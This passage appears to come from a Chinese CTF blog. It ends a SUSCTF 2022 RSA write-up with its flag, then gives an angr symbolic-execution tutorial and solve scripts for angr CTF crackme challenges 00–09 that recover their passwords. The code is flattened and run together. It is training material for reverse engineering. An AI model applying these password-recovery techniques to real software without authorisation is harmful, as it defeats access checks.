'1')r1_all=findAllPRoot(r1,p,p_e)r2_all=findAllPRoot(r2,q,q_e)print('2',len(r1_all),len(r2_all))for i1 in r1_all: for i2 in r2_all: solve=crt([i1,i2],[p,q]) if b'SUSCTF' in long_to_bytes(solve): print(long_to_bytes(solve)) exit()print('end')# print(c_) SUSCTF{N0n_c0prime_RSA_c1pher_cAn_a1s0_recover_me33age!!!} 可惜效率不太理想，跑了接近一小时才出来 参考了dl的wp，发现可以通过快速找到特解，并遍历其解空间来更快地求解问题 1234567891011n,e=p*q,ep*eqphi=(p-1)*(q-1)c=pow(c,invert(er,phi),n)g0=pow(2,phi//e,n)m0=pow(c,invert(e,phi//e),n)for i in tqdm(range(e)): assert pow(m0,e,n)==c%n m=long_to_bytes(m0) if b'SUSCTF' in m: exit(print(m)) m0=m0*g0%n 大概只用20min 参考资料：RSA &amp; Incorrect Keys | Rec (rechn0.github.io)","link":"/2022/03/03/SUSCTF2022-large-case/"},{"title":"Reverse angr","text":"[Toc] 符号执行符号执行就是在运行程序时，用符号来替代真实值。符号执行相较于真实值执行的优点在于，当使用真实值执行程序时，我们能够遍历的程序路径只有一条, 而使用符号进行执行时，由于符号是可变的，我们就可以利用这一特性，尽可能的将程序的每一条路径遍历，这样的话，必定存在至少一条能够输出正确结果的分支, 每一条分支的结果都可以表示为一个离散关系式,使用约束求解引擎即可分析出正确结果。 Angr安装(31条消息) kali中angr的安装步骤_流风_霜的博客-CSDN博客 安装好后通过命令 source venv/bin/avtivate 进入虚拟环境中，即可使用angr 使用方法新建一个工程12import angrproj=angr.Project('/bin/true') 然后可以得到二进制文件的信息，如： 123proj.filename #文件名proj.arch #一个archinfo.Arch对象hex(proj.entry) #入口点 '0x401370' 通常在创建工程时选择关闭auto_load_libs以避免angr加载共享库： 1p=angr.Project('/bin/true',auto_load_libs=False) 如果auto_load_libs是True（默认值），真正的库函数会被执行。这可能正是也可能不是你想要的，取决于具体的函数。比如说一些libc的函数分析起来过于复杂并且很有可能引起path对其的尝试执行过程中的state数量的爆炸增长 如果auto_load_libs是False，且外部函数是无法找到的，并且Project会将它们引用到一个通用的叫做ReturnUnconstrained的SimProcedure上去，它就像它的名字所说的那样：它返回一个不受约束的值 设置state1initial_state=project.factory.entry_state() state代表程序的一个实例镜像，模拟执行某个时刻的状态，就类似于快照。保存运行状态的上下文信息，如内存/寄存器等,我们这里使用project.factory.entry_state()告诉符号执行引擎从程序的入口点开始符号执行，除了使用.entry_state() 创建 state 对象, 我们还可以根据需要使用其他构造函数创建 state 除了使用.entry_state() 创建 state 对象, 我们还可以根据需要使用其他构造函数创建 state: 名称 描述 .entry_state() 构造一个已经准备好从函数入口点执行的状态 .blank_state 构造一个“空状态”，它的大多数数据都是未初始化的。当使用未初始化的的数据时，一个不受约束的符号值将会被返回 .call_state 构造一个已经准备好执行某个函数的状态 .full_init_state 构造一个已经执行过所有与需要执行的初始化函数，并准备从函数入口点执行的状态。比如，共享库构造函数（constructor）或预初始化器。当这些执行完之后，程序将会跳到入口点 设置 Simulation Managers1simulation = project.factory.simgr(initial_state) Project 对象仅表示程序一开始的样子，而在执行时，我们实际上是对SimState对象进行操作，它代表程序的一个实例镜像，模拟执行某个时刻的状态 SimState 对象包含程序运行时信息，如内存/寄存器/文件系统数据等。SM（Simulation Managers）是angr中最重要的控制接口，它使你能够同时控制一组状态(state)的符号执行，应用搜索策略来探索程序的状态空间。 模拟管理器具有不同的探索策略，默认策略为广度优先搜索，使用不同的探索策略可以通过调用 simgr.use_technique(tech) 来实现，其中 tech 是一个 ExplorationTechnique 子类的实例，angr 内置的探索技术在 angr.exploration_techniques 下 Explorer：该技术实现了 .explore() 功能，允许在探索时查找或避免某些地址。 DFS：深度优先搜索，每次只探索一条路径，其它路径会放到 deferred stash 中。直到当前路径探索结束，再从 deferred 中取出最长的一条继续探索。 LoopLimiter：限制路径的循环次数，超出限制的路径将被放到 discard stash 中。 LengthLimiter：限制路径的最大长度 ManualMergepoint：将程序中的某个地址标记为合并点，将在一定时间范围内到达的所有 state 合并在一起。 Veritesting：是这篇论文的实现，试图识别出有用的合并点来解决路径爆炸问题。在创建 SimulationManager 时通过 veritesting=True 来开启。 Tracer：记录在某个具体输入下的执行路径，结果是执行完最后一个 basic block 的 state，存放在 traced stash 中。 Oppologist：当遇到某个不支持的指令时，它将具体化该指令的所有输入并使用 unicorn engine 继续执行。 Threading：将线程级并行添加到探索过程中。 Spiller：当处于 active 的 state 过多时，将其中一些转存到磁盘上以保持较低的内存消耗。 运行，探索满足路径需要的值1simulation.explore=(find=your_address) 符号执行最普遍的操作是找到能够到达某个地址的状态，同时丢弃其他不能到达这个地址的状态。SM为使用这种执行模式提供了.explore()方法 当使用find参数启动.explore()方法时，程序将会一直执行，直到发现了一个和find参数指定的条件相匹配的状态。find参数的内容可以是想要执行到的某个地址、或者想要执行到的地址列表、或者一个获取state作为参数并判断这个state是否满足某些条件的函数。当activestash中的任意状态和find中的条件匹配的时候，它们就会被放到found stash中，执行随即停止。之后你可以探索找到的状态，或者决定丢弃它，转而探索其它状态。 获取执行结果当找到匹配的条件的时候，相关的状态被保存在simgr当中，我们可以通过simgr.found来访问所有符合条件的分支 1234if simulation.found: solution_state = simulation.found[0] # 获取通过 explore 找到符合条件的状态 solution = solution_state.posix.dumps(sys.stdin.fileno()) print(&quot;[+] Success! Solution is: {}&quot;.format(solution.decode(&quot;utf-8&quot;))) 位向量(bitvector)更准确的说是符号位向量，符号位向量是angr用于将符号值注入程序的数据类型。这些将是angr将解决的方程式的“ x”，也就是约束求解时的自变量。可以通过 BVV(value,size) 和 BVS( name, size) 接口创建位向量，也可以用 FPV 和 FPS 来创建浮点值和符号 这里使用BVS生成了一个位向量，此方法有两个参数：第一个是angr用来引用位向量的名称，第二个是位向量的大小（以bit为单位） 12size_in_bits=32x=claripy.BVS('x', size_in_bits) 访问寄存器可以通过statr.regs对象的属性来访问或修改寄存器的数据，例： 1initial_state.regs.eax=passwd0 eval solver.eval(expression) 将会解出一个可行解 solver.eval_one(expression)将会给出一个表达式的可行解，若有多个可行解，则抛出异常。 solver.eval_upto(expression, n)将会给出最多n个可行解，如果不足n个就给出所有的可行解。 solver.eval_exact(expression, n)将会给出n个可行解，如果解的个数不等于n个，将会抛出异常。 solver.min(expression)将会给出最小可行解 solver.max(expression)将会给出最大可行解 另外还有还有cast_to可以接收一个参数来指定把结果映射到哪种数据类型。目前这个参数只能是str，它将会以字符串形式展示返回的结果 Hook 钩子编程（hooking），也称作“挂钩”，是计算机程序设计术语，指通过拦截软件模块间的函数调用、消息传递、事件传递来修改或扩展操作系统、应用程序或其他软件组件的行为的各种技术。处理被拦截的函数调用、事件、消息的代码，被称为钩子（hook）。 简单来说就是用我们自己设计的函数去取代被hook的函数 一个简单的例子： 123@project.hook(0x1234,length=5)def set_rax(state): state.regs.rax=1 Hooking Symbols每一个程序都有一个符号表，angr可以确保从每个导入符号都可以解析出地址，可以使用angr提供的Project.hook_symbolAPI来通过符号名来Hook函数所有的调用地址，这意味着可以用自己的代码替换函数，一个简单的例子： 12345678&gt;&gt;&gt; class NotVeryRand(SimProcedure):... def run(self, return_values=None):... rand_idx = self.state.globals.get('rand_idx', 0) % len(return_values)... out = return_values[rand_idx]... self.state.globals['rand_idx'] = rand_idx + 1... return out&gt;&gt;&gt; project.hook_symbol('rand', NotVeryRand(return_values=[413, 612, 1025, 1111])) pre-binary 选项如果你想要对一个特定的二进制对象设置一些选项，CLE也能满足你的需求在加载二进制文件时可以设置特定的参数，使用 main_opts 和 lib_opts 参数进行设置。 backend - 指定 backend base_addr - 指定基址 entry_point - 指定入口点 arch - 指定架构 示例如下： 12&gt;&gt;&gt; angr.Project('examples/fauxware/fauxware', main_opts={'backend': 'blob', 'arch': 'i386'}, lib_opts={'libc.so.6': {'backend': 'elf'}})&lt;Project examples/fauxware/fauxware&gt; 参数main_opts和lib_opts接收一个以python字典形式存储的选项组。main_opts接收一个形如{选项名1：选项值1，选项名2：选项值2……}的字典，而lib_opts接收一个库名到形如{选项名1:选项值1，选项名2:选项值2……}的字典的映射。 lib_opts是二级字典，原因是一个二进制文件可能加载多个库，而main_opts指定的是主程序加载参数，而主程序一般只有一个，因此是一级字典。 这些选项的内容因不同的后台而异，下面是一些通用的选项： backend —— 使用哪个后台，可以是一个对象，也可以是一个名字(字符串) custom_base_addr —— 使用的基地址 custom_entry_point —— 使用的入口点 custom_arch —— 使用的处理器体系结构的名字 题目 from angr CTF题目来源：angr CTF (oregonctf.org) 00_angr_find123456789101112131415161718192021222324252627282930import angrimport sysdef main(argv): path_to_binary = '00_angr_find' # :string project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) simulation = project.factory.simgr(initial_state) print_good_address = 0x080492f8 # :integer (probably in hexadecimal) simulation.explore(find=print_good_address) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()).decode()) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 01_angr_avoid12345678910111213141516171819202122232425import angrimport sysdef main(argv): path_to_binary = '01_angr_avoid' project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) simulation = project.factory.simgr(initial_state) print_good_address = 0x08049300 will_not_succeed_address = 0x080492bb simulation.explore(find=print_good_address, avoid=will_not_succeed_address) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()).decode()) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 02_angr_find_condition通过程序输出判断是否符合条件（此题把第一题改一改也能过，但这样就没意思了） 1234567891011121314151617181920212223242526272829303132333435import angrimport sysdef main(argv): path_to_binary = '02_angr_find_condition' project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) simulation = project.factory.simgr(initial_state) def is_successful(state):# Dump whatever has been printed out by the binary so far into a string. stdout_output = state.posix.dumps(sys.stdout.fileno()) # Return whether 'Good Job.' has been printed yet. # (!) return stdout_output==b'Enter the password: Good Job.\\n' # :boolean def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return stdout_output==b'Enter the password: Try again.\\n' # :boolean simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()).decode()) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 03_angr_simbolic_registersangr在处理scanf等复杂输入时不太方便，此时将入口地址设置为输入函数之后，通过符号化寄存器来获得理想输入 看一下汇编，输入的三个参数分别放在eax,ebx,edx三个寄存器中，我们需要符号化这三个寄存器 但是对于为什么在scanf执行后需要重设ebp=esp仍有不太理解… 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990# Angr doesn't currently support reading multiple things with scanf (Ex: # scanf(&quot;%u %u).) You will have to tell the simulation engine to begin the# program after scanf is called and manually inject the symbols into registers.import angrimport claripyimport sysdef main(argv): path_to_binary = '03_angr_symbolic_registers' project = angr.Project(path_to_binary) # Sometimes, you want to specify where the program should start. The variable # start_address will specify where the symbolic execution engine should begin. # Note that we are using blank_state, not entry_state. # (!) start_address = 0x08049626 # :integer (probably hexadecimal) initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # Create a symbolic bitvector (the datatype Angr uses to inject symbolic # values into the binary.) The first parameter is just a name Angr uses # to reference it. # You will have to construct multiple bitvectors. Copy the two lines below # and change the variable names. To figure out how many (and of what size) # you need, dissassemble the binary and determine the format parameter passed # to scanf. # (!) password0_size_in_bits = 32 # :integer password0 = claripy.BVS('password0', password0_size_in_bits) password1_size_in_bits = 32 # :integer password1 = claripy.BVS('password0', password1_size_in_bits) password2_size_in_bits = 32 # :integer password2 = claripy.BVS('password0', password2_size_in_bits) # Set a register to a symbolic value. This is one way to inject symbols into # the program. # initial_state.regs stores a number of convenient attributes that reference # registers by name. For example, to set eax to password0, use: # # initial_state.regs.eax = password0 # # You will have to set multiple registers to distinct bitvectors. Copy and # paste the line below and change the register. To determine which registers # to inject which symbol, dissassemble the binary and look at the instructions # immediately following the call to scanf. # (!) initial_state.regs.eax = password0 initial_state.regs.ebx = password1 initial_state.regs.edx = password2 simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] # Solve for the symbolic values. If there are multiple solutions, we only # care about one, so we can use eval, which returns any (but only one) # solution. Pass eval the bitvector you want to solve for. # (!) solution0 = solution_state.solver.eval(password0) solution1 = solution_state.solver.eval(password1) solution2 = solution_state.solver.eval(password2) # Aggregate and format the solutions you computed above, and then print # the full string. Pay attention to the order of the integers, and the # expected base (decimal, octal, hexadecimal, etc). solution = hex(solution0)[2:]+' '+hex(solution1)[2:]+' '+hex(solution2)[2:] # :string print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 04_angr_symbolic_stack符号化栈 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165# This challenge will be more challenging than the previous challenges that you# have encountered thus far. Since the goal of this CTF is to teach symbolic# execution and not how to construct stack frames, these comments will work you# through understanding what is on the stack.# ! ! !# IMPORTANT: Any addresses in this script aren't necessarily right! Dissassemble# the binary yourself to determine the correct addresses!# ! ! !import angrimport claripyimport sysdef main(argv): path_to_binary = '04_angr_symbolic_stack' project = angr.Project(path_to_binary) # For this challenge, we want to begin after the call to scanf. Note that this # is in the middle of a function. # # This challenge requires dealing with the stack, so you have to pay extra # careful attention to where you start, otherwise you will enter a condition # where the stack is set up incorrectly. In order to determine where after # scanf to start, we need to look at the dissassembly of the call and the # instruction immediately following it: # sub $0x4,%esp # lea -0x10(%ebp),%eax # push %eax # lea -0xc(%ebp),%eax # push %eax # push $0x80489c3 # call 8048370 &lt;__isoc99_scanf@plt&gt; # add $0x10,%esp # Now, the question is: do we start on the instruction immediately following # scanf (add $0x10,%esp), or the instruction following that (not shown)? # Consider what the 'add $0x10,%esp' is doing. Hint: it has to do with the # scanf parameters that are pushed to the stack before calling the function. # Given that we are not calling scanf in our Angr simulation, where should we # start? # (!) start_address = 0x080493f2 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # We are jumping into the middle of a function! Therefore, we need to account # for how the function constructs the stack. The second instruction of the # function is: # mov %esp,%ebp # At which point it allocates the part of the stack frame we plan to target: # sub $0x18,%esp # Note the value of esp relative to ebp. The space between them is (usually) # the stack space. Since esp was decreased by 0x18 # # /-------- The stack --------\\ # ebp -&gt; | | # |---------------------------| # | | # |---------------------------| # . . . (total of 0x18 bytes) # . . . Somewhere in here is # . . . the data that stores # . . . the result of scanf. # esp -&gt; | | # \\---------------------------/ # # Since we are starting after scanf, we are skipping this stack construction # step. To make up for this, we need to construct the stack ourselves. Let us # start by initializing ebp in the exact same way the program does. initial_state.regs.ebp = initial_state.regs.esp # scanf(&quot;%u %u&quot;) needs to be replaced by injecting two bitvectors. The # reason for this is that Angr does not (currently) automatically inject # symbols if scanf has more than one input parameter. This means Angr can # handle 'scanf(&quot;%u&quot;)', but not 'scanf(&quot;%u %u&quot;)'. # You can either copy and paste the line below or use a Python list. # (!) password0 = claripy.BVS('password0', 32) password1 = claripy.BVS('password1', 32) ... # Here is the hard part. We need to figure out what the stack looks like, at # least well enough to inject our symbols where we want them. In order to do # that, let's figure out what the parameters of scanf are: # sub $0x4,%esp # lea -0x10(%ebp),%eax # push %eax # lea -0xc(%ebp),%eax # push %eax # push $0x80489c3 # call 8048370 &lt;__isoc99_scanf@plt&gt; # add $0x10,%esp # As you can see, the call to scanf looks like this: # scanf( 0x80489c3, ebp - 0xc, ebp - 0x10 ) # format_string password0 password1 # From this, we can construct our new, more accurate stack diagram: # # /-------- The stack --------\\ # ebp -&gt; | padding | # |---------------------------| # ebp - 0x01 | more padding | # |---------------------------| # ebp - 0x02 | even more padding | # |---------------------------| # . . . &lt;- How much padding? Hint: how # |---------------------------| many bytes is password0? # ebp - 0x0b | password0, second byte | # |---------------------------| # ebp - 0x0c | password0, first byte | # |---------------------------| # ebp - 0x0d | password1, last byte | # |---------------------------| # . . . # |---------------------------| # ebp - 0x10 | password1, first byte | # |---------------------------| # . . . # |---------------------------| # esp -&gt; | | # \\---------------------------/ # # Figure out how much space there is and allocate the necessary padding to # the stack by decrementing esp before you push the password bitvectors. padding_length_in_bytes = 8 # :integer initial_state.regs.esp -= padding_length_in_bytes # Push the variables to the stack. Make sure to push them in the right order! # The syntax for the following function is: # # initial_state.stack_push(bitvector) # # This will push the bitvector on the stack, and increment esp the correct # amount. You will need to push multiple bitvectors on the stack. # (!) initial_state.stack_push(password1) # :bitvector (claripy.BVS, claripy.BVV, claripy.BV) initial_state.stack_push(password0) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution0 = solution_state.solver.eval(password0) solution1 = solution_state.solver.eval(password1) solution = str(solution1)+' '+str(solution0) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 05_angr_symbolic_memory内存符号化，取输入内容所存放的地址，然后将符号存到这个地址 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import angrimport claripyimport sysdef main(argv): path_to_binary = '05_angr_symbolic_memory' project = angr.Project(path_to_binary) start_address = 0x08049315 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # The binary is calling scanf(&quot;%8s %8s %8s %8s&quot;). # (!) password0 = claripy.BVS('password0', 64) password1 = claripy.BVS('password1', 64) password2 = claripy.BVS('password2', 64) password3 = claripy.BVS('password3', 64) # Determine the address of the global variable to which scanf writes the user # input. The function 'initial_state.memory.store(address, value)' will write # 'value' (a bitvector) to 'address' (a memory location, as an integer.) The # 'address' parameter can also be a bitvector (and can be symbolic!). # (!) password0_address = 0x09cdc1a0 initial_state.memory.store(password0_address, password0) password1_address = 0x09cdc1a8 initial_state.memory.store(password1_address, password1) password2_address = 0x09cdc1b0 initial_state.memory.store(password2_address, password2) password3_address = 0x09cdc1b8 initial_state.memory.store(password3_address, password3) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] # Solve for the symbolic values. We are trying to solve for a string. # Therefore, we will use eval, with named parameter cast_to=bytes # which returns bytes that can be decoded to a string instead of an integer. # (!) solution0 = solution_state.solver.eval(password0,cast_to=bytes).decode() solution1 = solution_state.solver.eval(password1,cast_to=bytes).decode() solution2 = solution_state.solver.eval(password2,cast_to=bytes).decode() solution3 = solution_state.solver.eval(password3,cast_to=bytes).decode() solution = solution0+solution1+solution2+solution3 print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 06_angr_symbolic_dynamic_memory这题使用了malloc来分配内存，因此需要使用符号化动态内存 而与其获得每一次malloc分配的地址，不如直接虚构一个假地址，并将这个假地址写入内存指针 回到我们最开始认识angr的时候，我们知道angr并没有真正“运行”二进制文件（至少到目前为止），它只是在模拟运行状态，因此它实际上不需要将内存分配到堆中，实际上可以伪造任何地址。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import angrimport claripyimport sysdef main(argv): path_to_binary = '06_angr_symbolic_dynamic_memory' project = angr.Project(path_to_binary) start_address = 0x0804938c initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # The binary is calling scanf(&quot;%8s %8s&quot;). # (!) password0 = claripy.BVS('password0', 64) password1 = claripy.BVS('password1', 64) # Instead of telling the binary to write to the address of the memory # allocated with malloc, we can simply fake an address to any unused block of # memory and overwrite the pointer to the data. This will point the pointer # with the address of pointer_to_malloc_memory_address0 to fake_heap_address. # Be aware, there is more than one pointer! Analyze the binary to determine # global location of each pointer. # Note: by default, Angr stores integers in memory with big-endianness. To # specify to use the endianness of your architecture, use the parameter # endness=project.arch.memory_endness. On x86, this is little-endian. # (!) fake_heap_address0 = 0x08094035 pointer_to_malloc_memory_address0 = 0x09ec4c94 initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness) fake_heap_address1 = 0x08094055 pointer_to_malloc_memory_address1 = 0x09ec4c9c initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness) # Store our symbolic values at our fake_heap_address. Look at the binary to # determine the offsets from the fake_heap_address where scanf writes. # (!) initial_state.memory.store(fake_heap_address0, password0) initial_state.memory.store(fake_heap_address1, password1) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution0 = solution_state.solver.eval(password0,cast_to=bytes).decode() solution1 = solution_state.solver.eval(password1,cast_to=bytes).decode() solution = solution0+solution1 print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 07_angr_symbolic_file此题需要读取一个文件作为密码，因此我们需要利用angr的文件系统模拟出一个文件，从而进行符号化处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102# This challenge could, in theory, be solved in multiple ways. However, for the# sake of learning how to simulate an alternate filesystem, please solve this# challenge according to structure provided below. As a challenge, once you have# an initial solution, try solving this in an alternate way.## Problem description and general solution strategy:# The binary loads the password from a file using the fread function. If the# password is correct, it prints &quot;Good Job.&quot; In order to keep consistency with# the other challenges, the input from the console is written to a file in the # ignore_me function. As the name suggests, ignore it, as it only exists to# maintain consistency with other challenges.# We want to:# 1. Determine the file from which fread reads.# 2. Use Angr to simulate a filesystem where that file is replaced with our own# simulated file.# 3. Initialize the file with a symbolic value, which will be read with fread# and propogated through the program.# 4. Solve for the symbolic input to determine the password.import angrimport claripyimport sysdef main(argv): path_to_binary = '07_angr_symbolic_file' project = angr.Project(path_to_binary) start_address = 0x08049550 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # Specify some information needed to construct a simulated file. For this # challenge, the filename is hardcoded, but in theory, it could be symbolic. # Note: to read from the file, the binary calls # 'fread(buffer, sizeof(char), 64, file)'. # (!) filename = 'KAZSUXSF.txt' # :string symbolic_file_size_bytes = 0x40 # Construct a bitvector for the password and then store it in the file's # backing memory. For example, imagine a simple file, 'hello.txt': # # Hello world, my name is John. # ^ ^ # ^ address 0 ^ address 24 (count the number of characters) # In order to represent this in memory, we would want to write the string to # the beginning of the file: # # hello_txt_contents = claripy.BVV('Hello world, my name is John.', 30*8) # # Perhaps, then, we would want to replace John with a # symbolic variable. We would call: # # name_bitvector = claripy.BVS('symbolic_name', 4*8) # # Then, after the program calls fopen('hello.txt', 'r') and then # fread(buffer, sizeof(char), 30, hello_txt_file), the buffer would contain # the string from the file, except four symbolic bytes where the name would be # stored. # (!) password = claripy.BVS('password', symbolic_file_size_bytes * 8) # Construct the symbolic file. The file_options parameter specifies the Linux # file permissions (read, read/write, execute etc.) The content parameter # specifies from where the stream of data should be supplied. If content is # an instance of SimSymbolicMemory (we constructed one above), the stream will # contain the contents (including any symbolic contents) of the memory, # beginning from address zero. # Set the content parameter to our BVS instance that holds the symbolic data. # (!) password_file = angr.storage.SimFile(filename, content=password) # Add the symbolic file we created to the symbolic filesystem. initial_state.fs.insert(filename, password_file) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution = solution_state.solver.eval(password,cast_to=bytes).decode() print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 08_angr_constraints通过添加约束解决路径爆炸问题 当一个程序存在循环结构时，即使逻辑十分简单也可能会产生规模十分巨大的执行路径。在符号执行的过程中，每个分支点都会产生两个实例，当程序中存在循环结构展开时，可能会导致程序分支路径数呈指数级增长，即路径爆炸问题。故我们需要提供更多的约束条件控制路径爆炸问题 为了避免路径爆炸，此题在完成求解时并不会进到check_equals_BMCCHUGEIQDYESGO函数中，而是在这之前停住，转而向求解得到的状态中添加约束，使约束向量等于最终的比较值，从而得到符合要求的输入。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108# The binary asks for a 16 character password to which is applies a complex# function and then compares with a reference string with the function# check_equals_[reference string]. (Decompile the binary and take a look at it!)# The source code for this function is provided here. However, the reference# string in your version will be different than AABBCCDDEEFFGGHH:## #define REFERENCE_PASSWORD = &quot;AABBCCDDEEFFGGHH&quot;;# int check_equals_AABBCCDDEEFFGGHH(char* to_check, size_t length) {# uint32_t num_correct = 0;# for (int i=0; i&lt;length; ++i) {# if (to_check[i] == REFERENCE_PASSWORD[i]) {# num_correct += 1;# }# }# return num_correct == length;# }## ...# # char* input = user_input();# char* encrypted_input = complex_function(input);# if (check_equals_AABBCCDDEEFFGGHH(encrypted_input, 16)) {# puts(&quot;Good Job.&quot;);# } else {# puts(&quot;Try again.&quot;);# }## The function checks if *to_check == &quot;AABBCCDDEEFFGGHH&quot;. Verify this yourself.# While you, as a human, can easily determine that this function is equivalent# to simply comparing the strings, the computer cannot. Instead the computer # would need to branch every time the if statement in the loop was called (16 # times), resulting in 2^16 = 65,536 branches, which will take too long of a # time to evaluate for our needs.## We do not know how the complex_function works, but we want to find an input# that, when modified by complex_function, will produce the string:# AABBCCDDEEFFGGHH.## In this puzzle, your goal will be to stop the program before this function is# called and manually constrain the to_check variable to be equal to the# password you identify by decompiling the binary. Since, you, as a human, know# that if the strings are equal, the program will print &quot;Good Job.&quot;, you can# be assured that if the program can solve for an input that makes them equal,# the input will be the correct password.import angrimport claripyimport sysdef main(argv): path_to_binary = '08_angr_constraints' project = angr.Project(path_to_binary) start_address = 0x0804935d initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) password = claripy.BVS('password', 128) password_address = 0x0804c040 initial_state.memory.store(password_address, password) simulation = project.factory.simgr(initial_state) # Angr will not be able to reach the point at which the binary prints out # 'Good Job.'. We cannot use that as the target anymore. # (!) address_to_check_constraint = 0x080493a9 simulation.explore(find=address_to_check_constraint) if simulation.found: solution_state = simulation.found[0] # Recall that we need to constrain the to_check parameter (see top) of the # check_equals_ function. Determine the address that is being passed as the # parameter and load it into a bitvector so that we can constrain it. # (!) constrained_parameter_address = 0x0804c040 constrained_parameter_size_bytes = 16 constrained_parameter_bitvector = solution_state.memory.load( constrained_parameter_address, constrained_parameter_size_bytes ) # We want to constrain the system to find an input that will make # constrained_parameter_bitvector equal the desired value. # (!) constrained_parameter_desired_value = 'BMCCHUGEIQDYESGO' # :string (encoded) # Specify a claripy expression (using Pythonic syntax) that tests whether # constrained_parameter_bitvector == constrained_parameter_desired_value. # Add the constraint to the state to let z3 attempt to find an input that # will make this expression true. solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value) # Solve for the constrained_parameter_bitvector. # (!) solution = solution_state.solver.eval(password,cast_to=bytes) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 09_angr_hooks学习使用angr的hook技术解决路径爆炸问题 钩子编程（hooking），也称作“挂钩”，是计算机程序设计术语，指通过拦截软件模块间的函数调用、消息传递、事件传递来修改或扩展操作系统、应用程序或其他软件组件的行为的各种技术。处理被拦截的函数调用、事件、消息的代码，被称为钩子（hook）。 简单来说就是用我们自己设计的函数去取代被hook的函数 在本题中需要用自己设计的skip_check_equals函数替代check_equals_函数 注意user_input_buffer_length要设置正确 